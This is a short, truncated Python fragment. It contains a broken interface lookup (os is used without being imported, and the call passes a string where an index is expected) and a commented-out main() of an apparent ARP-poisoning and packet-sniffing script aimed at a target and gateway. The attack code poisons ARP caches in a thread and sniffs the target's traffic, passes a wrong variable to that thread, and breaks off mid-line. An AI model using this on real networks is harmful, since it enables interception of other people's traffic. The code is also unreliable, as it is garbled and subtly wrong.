import socket
socket.if_indextoname(os.getenv('WLAN'))


'''
def main():
    options = get_arguments()
    conf.iface = options.interface
    conf.verb = 0
    print('[+] Setting up %s' % options.interface)
    gateway_mac = get_mac(options.gateway)
    if gateway_mac is None:
        print('[-] Gateway %s not reachable' % options.gateway)
        return
    target_mac = get_mac(options.target)
    if target_mac is None:
        print('[-] Target %s not reachable' % options.target)
        return
    poison_thread = threading.Thread(target=poison_target, args=(options.gateway, options.gateway_mac, options.target, options.target_mac))
    poison_thread.start()

    try:
        print('[*] Starting sniffer for %d packets' % options.packets)
        bpf_filter = 'IP host ' + options.target
        pkts = sniff(count=options.
